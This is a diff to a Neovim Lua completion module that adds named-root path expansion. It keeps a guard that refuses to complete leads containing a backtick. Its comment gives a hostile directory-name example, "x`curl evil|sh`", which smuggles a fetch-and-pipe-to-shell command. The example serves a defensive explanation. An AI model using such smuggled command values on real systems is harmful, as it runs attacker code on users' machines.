@@ -7,6 +7,7 @@
 local validators = require("lib.nvim.normalize.validators")
 local is_dir = require("lib.nvim.fs.is_dir")
 local expand_path = require("lib.nvim.cross.fs.expand_path")
+local roots = require("lib.nvim.fs.roots")
 
 local M = {}
 
@@ -141,13 +142,21 @@ M.register("BOOL", {
 -- Path family. Validation is intentionally soft for PATH (accept any token —
 -- the handler decides), strict for DIR/FILE. All three expand `~`, `$VAR`,
 -- `${VAR}` and `%VAR%` before validating/returning, so e.g. `root=$REPOS_DIR`
--- resolves instead of failing "not a directory" on the literal token.
+-- resolves instead of failing "not a directory" on the literal token. A leading
+-- reference to a named root (`lib.nvim.fs.roots`: `$NVIM_CONFIG_DIR`, an `extra`
+-- root, ...) is resolved by the registry, also where no real environment
+-- variable exists.
 ---@internal
---- `vim.fn.getcompletion` for a path lead typed by the user -- or inserted by an
---- earlier completion. A backtick in the lead is a command substitution to
---- Vim's wildcard expansion: a directory named like "x`curl evil|sh`" in a
---- downloaded folder would run its text the next time <Tab> is pressed on it.
---- Such a lead completes to nothing.
+--- Complete a path lead typed by the user -- or inserted by an earlier completion.
+---
+--- A lead naming a root (`${NAME}/x`, `$NAME/x`) is completed on its expansion, and every
+--- candidate is handed back in the spelling the user typed: `getcompletion` itself understands
+--- neither `${NAME}` nor a root without an environment variable. A bare `$NA` / `%NA` completes
+--- the names of the known roots.
+---
+--- A backtick in the lead is a command substitution to Vim's wildcard expansion: a directory named
+--- like "x`curl evil|sh`" in a downloaded folder would run its text the next time <Tab> is pressed
+--- on it. Such a lead completes to nothing.
 ---@param arg_lead string
 ---@param kind "file"|"dir"
 ---@return string[]
@@ -155,6 +164,37 @@ local function path_completion(arg_lead, kind)
   if arg_lead:find("`", 1, true) then
     return {}
   end
+
+  local partial = arg_lead:match("^%$([%w_]*)$") or arg_lead:match("^%%([%w_]*)$")
+  if partial then
+    local out = {}
+    for _, name in ipairs(roots.names()) do
+      if name:lower():sub(1, #partial) == partial:lower() then
+        out[#out + 1] = "$" .. name .. "/"
+      end
+    end
+    if #out > 0 then
+      return out
+    end
+  end
+
+  local _, root, rest = roots.match(arg_lead)
+  if root then
+    local head = arg_lead:sub(1, #arg_lead - #rest)
+    local expanded = roots.expand(arg_lead)
+    local ok, list = pcall(vim.fn.getcompletion, expanded, kind)
+    if not ok then
+      return {}
+    end
+    local out = {}
+    for _, cand in ipairs(list) do
+      if cand:sub(1, #root) == root then
+        out[#out + 1] = head .. cand:sub(#root + 1)
+      end
+    end
+    return out
+  end
+
   local ok, list = pcall(vim.fn.getcompletion, arg_lead, kind)
   return ok and list or {}
 end
